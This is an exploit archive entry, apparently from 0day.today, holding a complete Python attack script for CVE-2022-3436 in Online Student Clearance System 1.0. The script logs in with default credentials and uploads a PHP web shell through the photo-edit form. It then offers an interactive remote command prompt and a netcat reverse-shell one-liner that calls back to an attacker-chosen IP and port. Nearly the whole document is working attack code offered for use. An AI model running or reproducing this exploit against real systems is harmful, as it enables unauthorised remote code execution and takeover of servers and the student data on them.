@@ -1,0 +1,106 @@
+id: 39173
+date: 11/30/2023
+title: Online Student Clearance System 1.0 Shell Upload Exploit
+author: Akash Pandey
+cves: CVE-2022-3436
+
+#!/usr/bin/python3
+
+# Exploit Title: Online Student Clearance System - Unrestricted File Upload to RCE (Authenticated)
+# Date: 28/11/2023
+# Exploit Author: Akash Pandey aka l3v1ath0n
+# Version: <= 1.0
+# Tested on: Kali Linux
+# CVE : CVE-2022-3436
+
+import requests
+import time
+import os
+
+
+print("""
+
+                     ____   ___ ____  ____      _____ _  _  _____  __   
+  _____   _____     |___ \ / _ \___ \|___ \    |___ /| || ||___ / / /_  
+ / __\ \ / / _ \_____ __) | | | |__) | __) |____ |_ \| || |_ |_ \| '_ \ 
+| (__ \ V /  __/_____/ __/| |_| / __/ / __/_____|__) |__   _|__) | (_) |
+ \___| \_/ \___|    |_____|\___/_____|_____|   |____/   |_||____/ \___/ 
+                                                                                                                                              
+Exploit: By Akash Pandey aka l3v1ath0n, developed with ❤️:
+Twitter: https://twitter.com/_l3v1ath0n
+Github: https://www.github.com/1337-L3V1ATH0N/Exploit_Development/
+""")
+
+
+web_url = "http://192.168.1.26/student/" # Edit this as per your need
+username = "18/132010" # Default Username
+password = "11111111" # Default Password
+local_ip = "192.168.1.6" # Edit this IP to your local Ip for reverse shell
+local_port = "1337" # Port of local machine to connect reverse shell on...
+rev_shell = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + local_ip + " " + local_port + " >/tmp/f"
+
+# Firing request to login
+log_url = web_url+"login.php"
+
+#Telling script to use previous session
+session = requests.Session()
+
+#Post Body Data for login
+post_data = {'txtmatric_no':username,'txtpassword':password, 'btnlogin':''}
+
+#Sending request to web server with required post data
+response = session.post(log_url,data=post_data)
+
+# Checking Login if Successful:
+time.sleep(1)
+
+# Creating a shell file in current directory
+print("[i] Creating a shell file to upload.")
+
+with open("shell.php","w") as file:
+    file.write("<?php echo shell_exec($_GET['cmd'].' 2>&1'); ?>")
+    file.close()
+time.sleep(1)
+
+print("[i] Checking Login.")
+
+if response.history:
+    print("[+] Login Successful.")
+
+    time.sleep(1)
+
+    print("[i] Uploading Shell.")
+
+    # Step 1: Reads the shell.php file in current folder
+    # Step 2: Stores the content in filename called shell.php
+    # Step 3: Uses the variable name userImage to upload file to server.
+    file = {'userImage':('shell.php',open("shell.php","rb"))}
+    
+    # Sending payload as POST data to shell.php file
+    payload = {'userImage':"<?php echo shell_exec($_GET['cmd'].' 2>&1'); ?>",'btnedit':''}
+
+    # Uploading the malicious php file at below path using files and data values 
+    upload_response = session.post(web_url+"edit-photo.php",files=file,data=payload)
+    print ("[TIP] Run netcat to catch reverse-shell on nc. Edit IP and Port in script")
+    while True:
+        command = input("l3v1ath0n㉿CVE-2022-3436: ")
+        if command == "exit":
+            break
+        elif command == "netcat":
+            print("[!] Don't forget to start Netcat Listener")
+            time.sleep(3)
+            payload = {'cmd':rev_shell}
+            cmd = session.get(web_url+"uploads/shell.php?",params=payload)
+            print(cmd.text)
+        else:
+            payload = {'cmd':command}
+            cmd = session.get(web_url+"uploads/shell.php?",params=payload)
+            print(cmd.text)
+
+    print("\n[i] Closing this Session")
+    session.close()
+
+else:
+    print("[-] Login Failed.")
+
+#  0day.today [2023-12-10]  #
